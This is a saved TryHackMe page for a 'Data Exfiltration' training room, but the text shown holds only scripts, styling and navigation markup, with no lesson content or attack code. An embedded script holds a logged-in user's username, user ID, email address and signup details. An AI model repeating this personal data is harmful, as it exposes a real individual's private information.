<!DOCTYPE html>
<!-- saved from url=(0038)https://tryhackme.com/room/dataxexfilt -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Data Exfiltration</title>
<meta name="description" content="An introduction to Data Exfiltration and Tunneling techniques over various protocols.">
<meta name="og:description" content="An introduction to Data Exfiltration and Tunneling techniques over various protocols.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Data Exfiltration">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/e5312ff592695831c1667e10033d13e7.png">
<meta property="og:url" content="https://tryhackme.com/room/dataxexfilt">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="An introduction to Data Exfiltration and Tunneling techniques over various protocols.">

<script type="text/javascript" async="" src="./TryHackMe _ Data Exfiltration_files/pgpbhph6"></script><script src="./TryHackMe _ Data Exfiltration_files/jquery.min.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Data Exfiltration_files/boostrap431.min.css">
<script src="./TryHackMe _ Data Exfiltration_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Data Exfiltration_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Data Exfiltration_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Data Exfiltration_files/general-style.css">
<script src="./TryHackMe _ Data Exfiltration_files/script.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Data Exfiltration_files/cookieconsent.min.css">
<script src="./TryHackMe _ Data Exfiltration_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Data Exfiltration_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Data Exfiltration_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Data Exfiltration_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><script async="" src="./TryHackMe _ Data Exfiltration_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Data Exfiltration_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Data Exfiltration_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Data Exfiltration_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Data Exfiltration_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Data Exfiltration_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Data Exfiltration_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Data Exfiltration_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Data Exfiltration_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Data Exfiltration_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/dataxexfilt#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/dataxexfilt#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
 <script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/dataxexfilt#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/dataxexfilt#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Data Exfiltration_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
